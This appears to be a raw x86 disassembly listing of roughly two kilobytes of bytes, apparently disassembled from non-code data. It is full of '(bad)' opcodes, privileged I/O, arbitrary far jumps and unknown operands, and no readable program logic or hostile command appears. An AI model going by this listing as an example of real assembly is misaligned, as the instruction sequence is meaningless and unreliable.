  42348f:	lea    eax,[esi]
  423491:	adc    ch,dl
  423493:	lods   al,BYTE PTR ds:[esi]
  423494:	xchg   edx,eax
  423495:	(bad)
  42349a:	lods   eax,DWORD PTR ds:[esi]
  42349b:	loop   0x42342a
  42349d:	sub    DWORD PTR [edx],edx
  42349f:	jmp    0xf784:0xeb6292bc
  4234a6:	sub    al,0x25
  4234a8:	pop    ss
  4234a9:	mov    al,ds:0x41ba9598
  4234ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234af:	mov    dl,dl
  4234b1:	xchg   edx,eax
  4234b2:	mov    eax,0xd76c323b
  4234b7:	adc    eax,0xffba5da3
  4234bc:	xchg   BYTE PTR [ebx-0x59],cl
  4234bf:	jmp    0x423534
  4234c1:	and    DWORD PTR [eax-0x4e],edi
  4234c4:	aas    
  4234c5:	and    DWORD PTR [ebp-0x3ebf7ae3],esp
  4234cb:	add    DWORD PTR [edx-0x1f46e92b],ecx
  4234d1:	scas   eax,DWORD PTR es:[edi]
  4234d2:	and    bh,dl
  4234d4:	jno    0x42345c
  4234d6:	shl    DWORD PTR [ecx+0x527b7636],cl
  4234dc:	pop    es
  4234dd:	in     al,0xa7
  4234df:	jle    0x4234ee
  4234e1:	push   ss
  4234e2:	mov    esi,0xd3724ca5
  4234e7:	imul   esi,DWORD PTR [ebx],0x25
  4234ea:	adc    al,0x4
  4234ec:	mov    dl,0x23
  4234ee:	test   al,0x5
  4234f0:	sbb    edi,esi
  4234f2:	cmp    bl,BYTE PTR [eax+0x40]
  4234f5:	repnz inc esi
  4234f7:	pop    edx
  4234f8:	popf   
  4234f9:	retf   0xe6ad
  4234fc:	sahf   
  4234fd:	sub    ecx,esp
  4234ff:	dec    edx
  423500:	xchg   edi,eax
  423501:	xlat   BYTE PTR ds:[ebx]
  423502:	dec    esi
  423503:	mov    al,ds:0xd7e5e073
  423508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423509:	div    DWORD PTR [edi+esi*2]
  42350c:	in     eax,0xb3
  42350e:	popf   
  42350f:	and    edi,DWORD PTR [esi]
  423511:	mov    BYTE PTR [ebp-0xa],0x8
  423515:	inc    ebp
  423516:	inc    edx
  423517:	sub    DWORD PTR [edx-0x2],eax
  42351a:	push   es
  42351b:	std    
  42351c:	inc    edi
  42351d:	add    eax,DWORD PTR [esi]
  42351f:	cwde   
  423520:	push   esi
  423521:	or     BYTE PTR [ebx-0x20],bh
  423524:	inc    ecx
  423525:	(bad)  
  423526:	or     edi,esi
  423528:	lea    esp,[edx-0x73]
  42352b:	xlat   BYTE PTR ds:[ebx]
  42352c:	dec    esi
  42352d:	sub    al,0xbb
  42352f:	das    
  423530:	pop    esi
  423531:	and    DWORD PTR ds:0x99b52fcd,edx
  423537:	and    cl,BYTE PTR [edi+0x56]
  42353a:	aas    
  42353b:	int3   
  42353c:	loop   0x423562
  42353e:	pop    ecx
  42353f:	mov    esp,0xc6e2eec2
  423544:	mov    eax,0xc1206513
  423549:	sbb    eax,0xdf3c8d65
  42354e:	retf   0xcdae
  423551:	and    edx,edi
  423553:	outs   dx,BYTE PTR ds:[esi]
  423554:	aas    
  423555:	sub    BYTE PTR [eax-0x5f791398],0xb5
  42355c:	fstp   QWORD PTR ds:0x8084
  423561:	mov    ebx,0xc15c79e3
  423566:	data16 idiv cl
  423569:	inc    ebx
  42356a:	out    0xca,al
  42356c:	push   edi
  42356d:	fmulp  st(1),st
  42356f:	(bad)  
  423570:	cwde   
  423571:	mov    al,ds:0x4296a28e
  423576:	dec    esp
  423577:	mov    eax,ds:0xc652f6f5
  42357c:	mov    eax,0xf8f2bf3d
  423581:	je     0x42353d
  423583:	(bad)  [eax+0x55dd2b3b]
  423589:	shl    edi,0x1
  42358c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42358d:	jae    0x423563
  42358f:	test   edi,ebp
  423591:	cwde   
  423592:	push   esp
  423593:	mov    ds,WORD PTR [ebp+0x71]
  423596:	mov    ecx,0x8fe39417
  42359b:	mov    ecx,0x955d3eb4
  4235a0:	mov    cs,WORD PTR [ecx-0x289cbec7]
  4235a6:	mov    eax,0x126b40f3
  4235ab:	in     al,0xc3
  4235ad:	sbb    al,BYTE PTR [eax]
  4235af:	in     al,0x6b
  4235b1:	jnp    0x4235bf
  4235b3:	dec    eax
  4235b4:	push   eax
  4235b5:	mov    bh,0x1
  4235b7:	ja     0x4235cc
  4235b9:	lods   eax,DWORD PTR ds:[esi]
  4235ba:	mov    dh,0x98
  4235bc:	std    
  4235bd:	std    
  4235be:	aas    
  4235bf:	jl     0x423632
  4235c1:	jl     0x4235a9
  4235c3:	das    
  4235c4:	mov    eax,ds:0xd5e975b5
  4235c9:	lock sbb ecx,eax
  4235cc:	mov    ebx,ebx
  4235ce:	sub    al,0xdf
  4235d0:	push   0x68d1bb0f
  4235d5:	or     al,0xed
  4235d7:	(bad)  
  4235d8:	fisub  DWORD PTR [edx+0x74c72b17]
  4235de:	test   al,0xb5
  4235e0:	sub    ebx,DWORD PTR [ebx+0x1]
  4235e3:	push   edx
  4235e4:	mov    eax,0xcf92fa05
  4235e9:	sub    dl,BYTE PTR [ecx]
  4235eb:	dec    eax
  4235ec:	push   es
  4235ed:	inc    ebp
  4235ee:	(bad)
  4235f3:	popa   
  4235f4:	lahf   
  4235f5:	mov    edi,0xb4e3dc80
  4235fa:	sar    DWORD PTR [edi],0xc7
  4235fd:	jbe    0x42367b
  4235ff:	inc    ecx
  423600:	xor    DWORD PTR [ebx-0x1a323c09],edx
  423606:	adc    DWORD PTR [eax-0x1e],esp
  423609:	mov    ch,0x89
  42360b:	push   es
  42360c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42360d:	and    BYTE PTR ds:0xac3ebacc,bh
  423613:	(bad)  
  423614:	ja     0x42364c
  423616:	loopne 0x4235fb
  423618:	sub    ecx,DWORD PTR [esp+ebp*8-0x488721aa]
  42361f:	popa   
  423620:	dec    ecx
  423621:	mov    esp,DWORD PTR [ecx-0x375f4719]
  423627:	scas   eax,DWORD PTR es:[edi]
  423628:	adc    esi,ebx
  42362a:	fstp   TBYTE PTR [edi-0xccdf179]
  423630:	das    
  423631:	(bad)  
  423632:	mov    eax,0xa6bb2d38
  423637:	mov    eax,ds:0x5f25ade4
  42363c:	je     0x423659
  42363e:	icebp  
  42363f:	sub    edx,DWORD PTR [ecx]
  423641:	add    eax,0x1b8ebd2a
  423646:	fsub   DWORD PTR [edx+edx*2-0x7bfe4e68]
  42364d:	jne    0x423614
  42364f:	out    0x69,eax
  423651:	jmp    0xe8b170ac
  423656:	js     0x423631
  423658:	mov    esp,0x94208680
  42365d:	xlat   BYTE PTR cs:[ebx]
  42365f:	hlt    
  423660:	jg     0x42365f
  423662:	cwde   
  423663:	sub    esi,edx
  423665:	mov    eax,ds:0x463c624d
  42366a:	or     eax,0xa741a60d
  42366f:	repnz add eax,0x9ed790db
  423675:	sub    esp,DWORD PTR gs:[edi+ebp*1+0x32]
  42367a:	in     eax,0xa2
  42367c:	div    bl
  42367e:	repz dec esi
  423680:	pop    eax
  423681:	pop    eax
  423682:	sbb    cl,bl
  423684:	iret   
  423685:	xor    ch,dl
  423687:	mov    ebp,0x3c8e1017
  42368c:	psraw  mm2,mm4
  42368f:	add    eax,0x6362ce0d
  423694:	cmp    edx,DWORD PTR [esi-0x7c]
  423697:	add    eax,0x70e230f1
  42369c:	iret   
  42369d:	push   ecx
  42369e:	cmp    BYTE PTR [eax+0x285fe141],dh
  4236a4:	call   0xe579:0x43e093d
  4236ab:	push   esp
  4236ac:	pusha  
  4236ad:	pop    eax
  4236ae:	xor    al,0xe6
  4236b0:	sub    edx,DWORD PTR [ecx]
  4236b2:	sbb    BYTE PTR [edi],bh
  4236b4:	adc    eax,0x1e4b7163
  4236b9:	xchg   edx,eax
  4236bb:	aaa    
  4236bc:	clc    
  4236bd:	cmp    DWORD PTR [ebp-0x29],esi
  4236c0:	add    al,0x69
  4236c2:	dec    eax
  4236c3:	pop    ecx
  4236c4:	xchg   ebx,eax
  4236c5:	popa   
  4236c6:	cmp    eax,0xa13e3139
  4236cb:	fisttp DWORD PTR [edi+edx*1+0x5d]
  4236cf:	push   ss
  4236d0:	jmp    DWORD PTR ds:0x52726038
  4236d6:	mov    dh,BYTE PTR [edx-0x75]
  4236d9:	pop    ss
  4236da:	ins    DWORD PTR es:[edi],dx
  4236db:	xchg   BYTE PTR [eax],cl
  4236dd:	(bad)  
  4236de:	stos   BYTE PTR es:[edi],al
  4236df:	inc    ebx
  4236e0:	jp     0x423669
  4236e2:	xchg   esp,eax
  4236e3:	pop    eax
  4236e4:	pop    esp
  4236e5:	leave  
  4236e6:	push   ebp
  4236e7:	mov    ds:0x54847a4,eax
  4236ec:	or     al,0x30
  4236ee:	and    BYTE PTR [eax-0x4fe143b],al
  4236f4:	jl     0x4236ae
  4236f6:	gs mov ebp,0x481bbc43
  4236fc:	in     al,dx
  4236fd:	mov    al,ds:0xaad8709d
  423702:	jp     0x423734
  423704:	add    BYTE PTR [edi+0x60112f7c],bh
  42370a:	add    DWORD PTR [ecx+0x6c],0x6f81ecdb
  423711:	(bad)  
  423712:	xchg   edi,eax
  423713:	rcr    BYTE PTR [edx],0xb4
  423716:	ja     0x423793
  423718:	xchg   BYTE PTR [edx+0x76],ch
  42371b:	add    DWORD PTR [ecx],0x45e824f
  423721:	or     eax,edi
  423723:	es stos DWORD PTR es:[edi],eax
  423725:	in     eax,0x15
  423727:	jno    0x4237a3
  423729:	jae    0x423723
  42372b:	sahf   
  42372c:	dec    ecx
  42372d:	xor    DWORD PTR [eax+0x13b97410],0x18
  423734:	aaa    
  423735:	inc    esi
  423736:	aaa    
  423737:	mov    ebx,esp
  423739:	not    eax
  42373b:	adc    DWORD PTR [ebx+ebx*4],0xffffffad
  42373f:	lock and al,al
  423742:	into   
  423743:	jae    0x423767
  423745:	jbe    0x4236df
  423747:	inc    ebp
  423748:	icebp  
  423749:	imul   edx,DWORD PTR ss:[edi-0x75],0x46acfd29
  423751:	mov    esp,0xc312d903
  423756:	pop    ebx
  423757:	inc    esp
  423758:	mov    al,ds:0x390d6079
  42375d:	bound  ebx,QWORD PTR [edx]
  42375f:	addr16 nop
  423761:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423762:	inc    esp
  423763:	(bad)  
  423764:	cmp    eax,0xba163f71
  423769:	test   al,0x60
  42376c:	fcmove st,st(1)
  42376e:	dec    edx
  42376f:	add    DWORD PTR [edi],ebp
  423771:	loope  0x423779
  423773:	fiadd  WORD PTR gs:[ecx+0x30b7aab9]
  42377a:	xchg   ebp,eax
  42377b:	into   
  42377c:	test   eax,0x4bba4140
  423781:	jne    0x4237ee
  423783:	pop    esi
  423784:	pop    ds
  423785:	pop    esp
  423786:	into   
  423787:	mov    ch,0xd
  423789:	and    DWORD PTR [ebp-0x4edbfb4d],0x3dc459d3
  423793:	sar    DWORD PTR [eax],0xd4
  423796:	jg     0x42379f
  423798:	scas   al,BYTE PTR es:[edi]
  423799:	jecxz  0x4237fe
  42379b:	div    BYTE PTR [ebp+edx*1+0x143b0290]
  4237a2:	inc    edi
  4237a3:	test   eax,0xd129d274
  4237a8:	add    BYTE PTR [edi-0x7b431731],0xae
  4237af:	inc    ecx
  4237b0:	mov    BYTE PTR [esp+eax*1-0x20],0xb4
  4237b5:	(bad)  
  4237b7:	cmp    al,0xbd
  4237b9:	inc    ebx
  4237ba:	mov    ebx,0x6db18fd5
  4237bf:	and    eax,0x12ca12fa
  4237c4:	adc    al,BYTE PTR [esi+0x69919e2f]
  4237ca:	cwde   
  4237cb:	jno    0x423840
  4237cd:	adc    dl,BYTE PTR gs:0xb5568a4d
  4237d4:	fs add bh,0x6
  4237d8:	mov    ch,al
  4237da:	mov    bl,0x53
  4237dc:	mov    ebp,DWORD PTR [esi-0x4b0be363]
  4237e2:	test   edx,edx
  4237e4:	pop    ss
  4237e5:	add    edx,DWORD PTR [edx-0x3a52625f]
  4237eb:	sar    DWORD PTR [ecx-0x26845af3],cl
  4237f1:	std    
  4237f2:	(bad)  
  4237f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237f4:	push   eax
  4237f5:	js     0x42383d
  4237f7:	push   ebx
  4237f8:	pop    edi
  4237f9:	hlt    
  4237fa:	cmp    ecx,DWORD PTR [edi-0x5e96b953]
  423800:	mov    bl,0x68
  423802:	xor    ebx,DWORD PTR [edi]
  423804:	out    0x3,eax
  423806:	cld    
  423807:	sbb    edi,DWORD PTR [edx-0x6c63e089]
  42380d:	(bad)  
  42380e:	xor    ecx,DWORD PTR [ebp+0x50]
  423811:	dec    eax
  423812:	push   ebx
  423813:	fdiv   QWORD PTR [eax+edx*1-0x37a58d57]
  42381a:	stc    
  42381b:	and    dl,BYTE PTR [eax]
  42381d:	in     al,dx
  42381e:	stos   BYTE PTR es:[edi],al
  42381f:	xor    BYTE PTR [ebx-0xdc0ab8f],ah
  423825:	dec    DWORD PTR [eax]
  423827:	sbb    eax,0xc6d07aa8
  42382c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42382d:	xor    al,0x46
  42382f:	mov    ebp,0x4f2a8b64
  423834:	mov    dl,0x12
  423836:	push   0x8492089a
  42383b:	push   eax
  42383c:	lds    ebp,FWORD PTR [ecx+0x29]
  42383f:	es enter 0xdf8,0x12
  423844:	mov    ebp,0x6aa6c407
  423849:	jne    0x423806
  42384b:	mov    ah,0x91
  42384d:	shl    BYTE PTR [esi+0x41],cl
  423850:	mov    dl,0xdf
  423852:	dec    edi
  423853:	cmp    esi,DWORD PTR [ebp+0x633b995d]
  423859:	mov    eax,ds:0xc853c90e
  42385e:	inc    eax
  42385f:	cld    
  423860:	fbld   TBYTE PTR [edi+0x50fac2a3]
  423866:	out    dx,eax
  423867:	shl    BYTE PTR [esi+0x3e78bab7],0x8f
  42386e:	stc    
  42386f:	ins    DWORD PTR es:[di],dx
  423871:	inc    edx
  423872:	jne    0x423863
  423874:	xchg   BYTE PTR [ebp+0xec5fe15],dl
  42387a:	mov    ah,0xa4
  42387c:	add    BYTE PTR [edx+0x11],al
  42387f:	mov    ebp,DWORD PTR [edx-0x30]
  423882:	and    DWORD PTR [edx],ebx
  423884:	xor    edi,DWORD PTR [eax+0x34]
  423887:	push   0x34bc75f4
  42388c:	sub    eax,0x3395b532
  423891:	(bad)  [esi-0x7]
  423894:	imul   edx,DWORD PTR [edx+eiz*8],0x6b840bab
  42389b:	popf   
  42389c:	dec    ecx
  42389d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42389e:	(bad)  
  42389f:	jnp    0x4238bb
  4238a1:	and    BYTE PTR [esi+0x33],cl
  4238a4:	xor    edi,ecx
  4238a6:	test   BYTE PTR [ebp+0x368e682a],ch
  4238ac:	jnp    0x42385b
  4238ae:	sbb    eax,0xe70556dc
  4238b3:	addr16 loope 0x42385a
  4238b6:	push   esi
  4238b7:	sar    cl,cl
  4238b9:	fst    QWORD PTR [edx+0x26]
  4238bc:	test   al,ch
  4238be:	arpl   WORD PTR [edx+ecx*2],dx
  4238c1:	mov    al,0xc4
  4238c3:	mov    bl,0x7d
  4238c5:	sbb    eax,0x93ae0abc
  4238ca:	nop
  4238cb:	out    dx,eax
  4238cc:	add    esp,DWORD PTR [edi]
  4238ce:	sub    ch,BYTE PTR [edi+0x71d01e5a]
  4238d4:	and    ch,ah
  4238d6:	test   eax,0xa2fa1bf3
  4238db:	inc    esp
  4238dc:	fbstp  TBYTE PTR [esi+0x58]
  4238df:	jge    0x423890
  4238e1:	les    edi,FWORD PTR ds:0x47f6d1ad
  4238e7:	pop    esi
  4238e8:	xchg   esp,eax
  4238e9:	xchg   esp,eax
  4238ea:	test   eax,0x1a42619
  4238ef:	call   0xed25:0xde22afaf
  4238f6:	int3   
  4238f7:	test   al,0xb8
  4238f9:	pop    ds
  4238fa:	pop    ebp
  4238fb:	or     eax,0x2c1e4d95
  423900:	mov    bl,0x17
  423902:	jge    0x42388d
  423904:	out    0xb5,eax
  423906:	test   DWORD PTR [edi],0x749cda3b
  42390c:	sub    DWORD PTR [eax+0x3],esi
  42390f:	and    al,0x2d
  423911:	add    eax,0xa79a6ec3
  423916:	mov    ebx,0x25eb83b1
  42391b:	dec    BYTE PTR [esi+esi*1-0x45cad17d]
  423922:	int    0x3a
  423924:	push   edi
  423925:	xlat   BYTE PTR ds:[ebx]
  423926:	xchg   esi,eax
  423927:	enter  0x4af3,0xb2
  42392b:	dec    ecx
  42392c:	push   ebx
  42392d:	gs add eax,0x13f7d810
  423933:	lds    esp,FWORD PTR [ebx-0x20]
  423936:	cwde   
  423937:	or     eax,0x4cade0c3
  42393c:	mov    cl,0x29
  42393e:	data16 fmul DWORD PTR ds:0x51189a6e
  423945:	add    DWORD PTR [ebx+0x5dd50a5e],eax
  42394b:	outs   dx,DWORD PTR ds:[esi]
  42394c:	nop
  42394d:	fcomp  st(5)
  42394f:	or     eax,0xc19e99e7
  423954:	ins    BYTE PTR es:[edi],dx
  423955:	dec    DWORD PTR [ecx-0x9]
  423958:	fisubr DWORD PTR [edi-0x454ad1dc]
  42395e:	push   edi
  42395f:	jae    0x423997
  423961:	inc    esi
  423962:	mov    eax,0xe0f45a46
  423967:	test   BYTE PTR [esi-0x68],cl
  42396a:	test   eax,0xcff24dde
  42396f:	cmp    eax,0x35519171
  423974:	call   0xba3f64ee
  423979:	xchg   edi,eax
  42397a:	fwait
  42397b:	jb     0x423963
  42397d:	add    DWORD PTR [edi],0x8
  423980:	xchg   ebp,eax
  423981:	out    0x18,al
  423983:	mov    ds:0xd54c81ac,eax
  423988:	push   ss
  423989:	jl     0x423955
  42398b:	pop    ecx
  42398c:	xchg   cl,bh
  42398e:	jno    0x423941
  423990:	mov    BYTE PTR [eax+edi*2+0x325ea90],ah
  423997:	adc    DWORD PTR [edi-0x268d456c],0x175c2db9
  4239a1:	hlt    
  4239a2:	dec    ebx
  4239a3:	mov    eax,0x53d8179c
  4239a8:	sbb    BYTE PTR [edx],bh
  4239aa:	xchg   ebp,eax
  4239ab:	dec    ebp
  4239ac:	push   edi
  4239ad:	mov    esi,0x9667d34a
  4239b2:	mov    bh,0xe9
  4239b4:	mov    WORD PTR [ebx],?
  4239b6:	sub    al,0x40
  4239b8:	mov    fs,WORD PTR [eax-0xd]
  4239bb:	cmp    DWORD PTR [esi-0x3aed19d0],esp
  4239c1:	les    ebx,FWORD PTR [eax+0x6fa1e8da]
  4239c7:	xchg   ebp,eax
  4239c8:	add    eax,0xce984d1c
  4239cd:	and    dh,cl
  4239cf:	or     DWORD PTR [ebx-0x20b7d05],ebp
  4239d5:	cmp    DWORD PTR [ebx-0x66421ba5],edx
  4239db:	jg     0x4239d7
  4239dd:	sub    eax,0xcbbdb421
  4239e2:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4239e4:	ret    0xa296
  4239e7:	dec    edi
  4239e8:	add    ebp,DWORD PTR [edx]
  4239ea:	shl    ebx,cl
  4239ec:	(bad)  
  4239ed:	sbb    eax,0xa9a48b4b
  4239f2:	and    al,0x5c
  4239f4:	shr    BYTE PTR [ecx],0x29
  4239f7:	in     eax,0xd7
  4239f9:	xor    ebp,esi
  4239fb:	xchg   DWORD PTR [ebp+ebx*2-0x435e45fe],edi
  423a02:	mov    WORD PTR [esi-0x6],?
  423a05:	loope  0x423992
  423a07:	das    
  423a08:	test   BYTE PTR [edi+0xa],0x55
  423a0c:	jp     0x423a05
  423a0e:	icebp  
  423a0f:	daa    
  423a10:	push   edi
  423a11:	shl    bl,cl
  423a13:	dec    ebx
  423a14:	rcl    BYTE PTR [esi-0xa3ab932],1
  423a1a:	adc    eax,0xed392c69
  423a1f:	or     ebp,DWORD PTR [edx-0x234d734c]
  423a25:	mov    edx,0x168ab0c5
  423a2a:	push   ebp
  423a2b:	push   ds
  423a2c:	or     esp,DWORD PTR [edx-0x24408ec4]
  423a32:	pop    ss
  423a33:	in     al,dx
  423a34:	and    BYTE PTR [ebp+ebx*1-0x222c1576],dh
  423a3b:	xchg   ecx,eax
  423a3c:	imul   ecx,DWORD PTR [edi],0x28e02293
  423a42:	jmp    0xc08a3711
  423a47:	sub    DWORD PTR [edx],ebx
  423a49:	mov    DWORD PTR [edx-0x39],eax
  423a4c:	or     ebp,ebp
  423a4e:	cld    
  423a4f:	xor    DWORD PTR [ecx+ebx*1+0x42c2c782],0x7f
  423a57:	cmp    esi,0xf27d8d91
  423a5d:	dec    eax
  423a5e:	xor    BYTE PTR [ecx-0x211dff85],al
  423a64:	sbb    eax,0x30818faa
  423a69:	jle    0x423a1b
  423a6b:	out    0xc8,eax
  423a6d:	jecxz  0x423a23
  423a6f:	icebp  
  423a70:	cmp    al,BYTE PTR [eax-0x23]
  423a73:	add    DWORD PTR [esi-0x74df2a59],edi
  423a79:	adc    dh,BYTE PTR [ecx]
  423a7b:	(bad)  ss:0x43f62bdf
  423a82:	cmp    ebp,DWORD PTR [ecx-0x6e]
  423a85:	retf   0x11d3
  423a88:	or     BYTE PTR [ebx+0x2c],dh
  423a8b:	imul   esp,DWORD PTR [ecx],0xdbb7a88c
  423a91:	arpl   WORD PTR [edx-0x5f],dx
  423a94:	(bad)  
  423a95:	sahf   
  423a96:	pop    ebx
  423a97:	xchg   BYTE PTR [edi],dh
  423a99:	les    edi,FWORD PTR [esi-0x41]
  423a9c:	or     ecx,DWORD PTR [ecx]
  423a9e:	(bad)  
  423a9f:	rcl    BYTE PTR [ecx+eax*2],cl
  423aa2:	call   0x443031ae
  423aa7:	push   eax
  423aa8:	fdivr  st(0),st
  423aaa:	jne    0x423abe
  423aac:	shl    ch,0x40
  423aaf:	adc    eax,0x235c6e2b
  423ab4:	xchg   ecx,eax
  423ab5:	imul   ecx,DWORD PTR [eax-0x6c],0x349530af
  423abc:	dec    edx
  423abd:	push   edx
  423abe:	fwait
  423abf:	mov    ecx,0xa44cbb5c
  423ac4:	stc    
  423ac5:	add    dh,dh
  423ac7:	and    al,0xc5
  423ac9:	inc    ebx
  423aca:	fisubr DWORD PTR [edx+0x64825b4]
  423ad0:	enter  0x6131,0xd9
  423ad4:	es xor al,0x3c
  423ad7:	mov    bl,0xfd
  423ad9:	dec    esi
  423ada:	enter  0x18e5,0x7c
  423ade:	aas    
  423adf:	fucomip st,st(6)
  423ae1:	push   ecx
  423ae2:	or     al,0xc5
  423ae4:	xchg   ebp,eax
  423ae5:	lock adc BYTE PTR [ebp+0x25d377aa],0x15
  423aed:	pop    ecx
  423aee:	xchg   ebp,eax
  423aef:	xchg   edx,eax
  423af0:	cmp    ebx,ecx
  423af2:	int    0xff
  423af4:	das    
  423af5:	pop    es
  423af6:	mov    eax,ds:0x8e131f60
  423afb:	mov    dh,0xe1
  423afd:	sub    al,0x62
  423aff:	ret    
  423b00:	stc    
  423b01:	mov    DWORD PTR [eax+eiz*2+0x2982c883],ebp
  423b08:	and    eax,0xe87975ff
  423b0d:	or     DWORD PTR [ecx+0x213f508b],ebx
  423b13:	lods   eax,DWORD PTR ds:[esi]
  423b14:	and    eax,0xc6916600
  423b19:	push   ds
  423b1a:	pop    es
  423b1b:	cmp    ebx,0xb4b67a53
  423b21:	mov    dh,0xa3
  423b23:	xchg   ebp,eax
  423b24:	out    dx,eax
  423b25:	or     al,BYTE PTR [ebx]
  423b27:	add    DWORD PTR [edx+0x25],ecx
  423b2a:	loop   0x423b26
  423b2c:	mov    esi,eax
  423b2e:	and    BYTE PTR cs:[ecx-0x5a6c4ba1],ah
  423b35:	mov    edi,0x9c8c4e8e
  423b3a:	les    edi,FWORD PTR ds:[esi+0x20]
  423b3e:	push   0xc63210d7
  423b43:	cmp    cl,BYTE PTR [edx+0x84af545]
  423b49:	fsubr  st,st(7)
  423b4b:	idiv   ebx
  423b4d:	adc    eax,0xb4bfc8c3
  423b52:	les    esi,FWORD PTR [edi]
  423b54:	cli    
  423b55:	mov    esp,0x9e346d65
  423b5a:	xchg   esp,eax
  423b5b:	fprem  
  423b5d:	cs fabs 
  423b60:	or     eax,0xd5b1bdc6
  423b65:	push   ebp
  423b66:	jnp    0x423b8b
  423b68:	and    al,0x28
  423b6a:	fwait
  423b6b:	outs   dx,BYTE PTR ds:[esi]
  423b6c:	(bad)  
  423b6d:	sbb    edi,ebp
  423b6f:	setne  BYTE PTR [ebx+0x9]
  423b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b74:	stc    
  423b75:	jmp    0xb9eb:0xd8916d7d
  423b7c:	test   DWORD PTR [eax+0x74f94980],0xb82dc557
  423b86:	rcl    BYTE PTR [ebp+0x68],1
  423b89:	jo     0x423b78
  423b8b:	push   0x5d2081bd
  423b90:	ficom  DWORD PTR fs:[esi-0x19f76a7a]
  423b97:	lahf   
  423b98:	dec    ebx
  423b99:	lods   al,BYTE PTR ds:[esi]
  423b9a:	xchg   esp,eax
  423b9b:	call   0x1059:0x499366b4
  423ba2:	lahf   
  423ba3:	dec    edx
  423ba4:	cdq    
  423ba5:	dec    eax
  423ba6:	imul   ecx,DWORD PTR [ebx-0x4f82ebd3],0x50b7edf0
  423bb0:	xor    al,0x2
  423bb2:	add    BYTE PTR [edi+0x5d4a64c4],dl
  423bb8:	sbb    ebp,esp
  423bba:	mov    dh,0x97
  423bbc:	push   cs
  423bbd:	xor    al,0x4e
  423bbf:	fsub   DWORD PTR [edi]
  423bc1:	sahf   
  423bc2:	mov    bl,0x14
  423bc4:	neg    DWORD PTR [ebp-0x39a72330]
  423bca:	daa    
  423bcb:	cmp    al,0xb5
  423bcd:	pop    esp
  423bce:	lods   al,BYTE PTR ds:[esi]
  423bcf:	loope  0x423c50
  423bd1:	sti    
  423bd2:	push   eax
  423bd3:	imul   ecx,ebp,0x61
  423bd6:	adc    DWORD PTR [esi-0x644db2c3],edx
  423bdc:	sub    dh,BYTE PTR [esi]
  423bde:	ja     0x423bb0
  423be0:	xchg   BYTE PTR [edi+0x77f79fcf],dh
  423be6:	or     ebx,DWORD PTR [eax+0x4d]
  423be9:	popa   
  423bea:	mov    cl,0xa1
  423bec:	shr    BYTE PTR [ecx+ecx*1+0x4d],1
  423bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423bf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423bf2:	call   0x9980da53
  423bf7:	inc    edi
  423bf8:	push   ebp
  423bf9:	push   esi
  423bfa:	push   esi
  423bfb:	push   ebp
  423bfc:	mov    WORD PTR [edi-0x71],gs
  423bff:	gs loopne 0x423bee
  423c02:	pop    ss
  423c03:	ins    BYTE PTR es:[edi],dx
  423c04:	and    DWORD PTR [eax-0xa],esi
  423c07:	jecxz  0x423c5b
  423c09:	cmp    eax,0x67311413
  423c0e:	call   0x68d11175
  423c13:	adc    DWORD PTR [bx-0xe8f],eax
  423c18:	cmp    dl,0xd2
  423c1b:	jmp    0x858acb1a
  423c20:	mov    edi,0x189087d7
  423c25:	js     0x423c54
  423c27:	pop    ds
  423c28:	fimul  DWORD PTR [esi+edi*4+0x37]
  423c2c:	xchg   ebp,eax
  423c2d:	dec    edi
  423c2e:	jmp    0x594d:0x155fdad9
  423c35:	fdiv   QWORD PTR [edx+edx*4+0x2feab19f]
  423c3c:	pop    ebp
  423c3d:	jns    0x423c23
  423c3f:	es (bad) 
  423c41:	pop    ebp
  423c42:	mov    ?,WORD PTR [eax+0x51]
  423c45:	scas   eax,DWORD PTR es:[edi]
  423c46:	inc    ecx
  423c47:	and    esp,ebp
  423c49:	cld    
  423c4a:	mov    ah,0x89
  423c4c:	dec    ebp
  423c4d:	or     ebx,edi
  423c4f:	jl     0x423c2f
  423c51:	cld    
  423c52:	mov    BYTE PTR [ebx],dh
  423c54:	mov    esi,0x2c31907a
  423c59:	(bad)  
  423c5a:	and    BYTE PTR [eax+0x63],ah
  423c5d:	popf   
  423c5e:	or     eax,DWORD PTR [edi+0x33dfb32f]
  423c64:	int    0x30
  423c66:	xor    dh,BYTE PTR [esi-0x4d]
  423c69:	in     al,0xa
  423c6b:	pop    edx
  423c6c:	fst    DWORD PTR [edx+eax*4+0x11]
  423c70:	in     al,dx
  423c71:	out    dx,eax
  423c72:	add    ch,BYTE PTR [edx+ecx*1-0x2e]
  423c76:	pusha  
  423c77:	xchg   ebx,eax
  423c78:	xor    al,0xd6
  423c7a:	ror    DWORD PTR ds:0x7586b13,1
  423c80:	pop    ss
  423c81:	add    DWORD PTR [edi],ebp
  423c83:	mov    edi,0x2657d2a7
  423c88:	sub    eax,DWORD PTR [ebx-0x2333842a]
  423c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c8f:	cmp    DWORD PTR [ebp+0x76],ebx
  423c92:	(bad)  
  423c93:	or     ecx,DWORD PTR [ebx]
  423c95:	push   es
  423c96:	(bad)  
  423c97:	jo     0x423c5e
  423c99:	das    
  423c9a:	push   ebp
  423c9b:	sahf   
  423c9c:	mov    ecx,0xf4363633
  423ca1:	adc    BYTE PTR [esi-0x19676185],ah
  423ca7:	dec    ecx
  423ca8:	and    al,0xdb
  423caa:	jmp    0xd530fc5f
  423caf:	lea    ecx,[edx-0x316552e9]
  423cb5:	mov    eax,ds:0x647bad97
  423cba:	in     eax,0x55
  423cbc:	mov    dl,0x71
  423cbe:	cdq    
  423cbf:	xor    dl,bh
  423cc1:	mov    al,0x5
  423cc3:	sti    
  423cc4:	mov    edi,0x615a922a
  423cc9:	ret    0xa1d6
  423ccc:	mov    dh,0x4d
  423cce:	and    edi,ebp
  423cd0:	jge    0x423cce
  423cd2:	or     bl,cl
  423cd4:	mov    bl,0xb5
  423cd6:	inc    eax
  423cd7:	ds test ebp,edi
